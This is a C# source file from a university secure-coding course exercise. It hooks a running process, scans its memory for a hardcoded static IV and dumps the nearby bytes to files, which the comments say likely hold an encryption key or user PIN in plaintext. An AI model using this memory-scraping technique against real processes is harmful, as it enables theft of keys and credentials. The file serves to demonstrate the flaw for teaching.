/* 
 * SCS Memory Reader / Analyzer
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 * Author: Elias Tatros
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace SecCodeSCSExploit
{
    /* The SCSMemoryReader uses the MemoryScanner to find a specified value in memory. It acts as a mediator between user UI and MemoryScanner.
     * It is also responsible for dumping the memory around the "area of interest" (i.e. addresses found by the MemoryScanner).
     */
    class SCSMemoryReader
    {
        #region Members
        // ReadMem provides Memory hooking / reading / writing functionality
        ReadMem readMem;

        // Base Pointer for main program module
        public IntPtr basePtr;

        // Starting Address
        private int addressBegin;
        // Ending Address
        private int addressEnd;
        // Direction of dump
        private bool upwardsDump; // true = upwards, false = downwards
        // Size of dump area in bytes
        private int dumpSizeBytes = 1024;
        #endregion

        #region Delegates & Events
        // Progress changed event delegate
        public delegate void ProgressChangedEventHandler(object sender, MemoryScanner.ProgressChangedEventArgs e);
        // Progress changed event
        public event ProgressChangedEventHandler ProgressChanged;

        // Message pending event delegate
        public delegate void MessagePendingEventHandler(object sender, MemoryScanner.MessagePendingEventArgs e);
        // Message pending event
        public event MessagePendingEventHandler MessagePending;
        #endregion

        #region Constructor
        // Create a new SCS Memory Reader
        public SCSMemoryReader(int addressBegin, int addressEnd, int dumpSizeBytes, bool upwardsDump)
        {
            this.addressBegin = addressBegin;
            this.addressEnd = addressEnd;
            this.dumpSizeBytes = dumpSizeBytes;
            this.upwardsDump = upwardsDump;
        }
        #endregion

        #region Methods

        // Hook the javaw SCS process and obtain its base address
        public bool hookProcess( String processName )
        {
            Process[] p = Process.GetProcessesByName( processName );
            if ( p.Length > 0 )
            {
                readMem = new ReadMem( p[0] );
                basePtr = p[0].MainModule.BaseAddress;

                return true;
            }
            else
            {
                return false;
            }
        }

        // Close process handle
        public bool closeHandle()
        {
            if (readMem != null)
            {
                return readMem.CloseHandle();
            }

            else
            {
                return false;
            }
        }

        // Scan memory for a certain value and dump the memory around it
        public void scanMemory()
        {
            // Define the value (byte sequence) to look for in memory (in this case the first 8 bytes of the static IV, ASCII encoded)
            Int64 searchValue = BitConverter.ToInt64(Encoding.ASCII.GetBytes("fedcba9876543210"), 0);
            // Int64 searchValue = 4051376414998685030; // equals "fedcba98" 
            
            // Initialize memory scanner, passing starting and ending address, search value and an instance of the low level memory reader
            MemoryScanner memoryScanner = new MemoryScanner(readMem, (IntPtr)addressBegin, (IntPtr)addressEnd, searchValue);
            
            // Subscribe to progress change events
            memoryScanner.ProgressChanged += new MemoryScanner.ProgressChangedEventHandler(memoryScanner_ProgressChanged);
            
            // Subscribe to message events
            memoryScanner.MessagePending += new MemoryScanner.MessagePendingEventHandler(memoryScanner_MessagePending);

            // Scan memory
            memoryScanner.scan();

            // Dump memory around the found occurences (likely to contain encryption key / user pin in plaintext)
            dumpMemoryArea(memoryScanner.FoundAddresses);
        }

        // Dump the memory around a certain address (showing that it contains sensitive information in plain text)
        public void dumpMemoryArea(List<int> addresses)
        {
            foreach (int address in addresses) 
            {
                MessagePending(this, new MemoryScanner.MessagePendingEventArgs(address.ToString("X") + ".txt >    Dumping memory area for address " + address.ToString("X") + " to file.", true));

                byte[] dump;
                if (this.upwardsDump)
                    dump = ReadMem.ReadMemory(address - this.dumpSizeBytes - 10, this.dumpSizeBytes, readMem.processHandle);
                else
                    dump = ReadMem.ReadMemory(address, this.dumpSizeBytes, readMem.processHandle);

                MemoryStream ms = new MemoryStream(dump);
                FileStream file = new FileStream(address.ToString("X") + ".txt", FileMode.Create, FileAccess.Write);
                ms.WriteTo(file);
                file.Close();
                ms.Close();
            }
        }
        #endregion

        #region Event Callback Methods
        public void memoryScanner_ProgressChanged(object sender, MemoryScanner.ProgressChangedEventArgs e)
        {
            ProgressChanged(this, e);
        }

        public void memoryScanner_MessagePending(object sender, MemoryScanner.MessagePendingEventArgs e)
        {
            MessagePending(this, e);
        }
        #endregion
    }
}
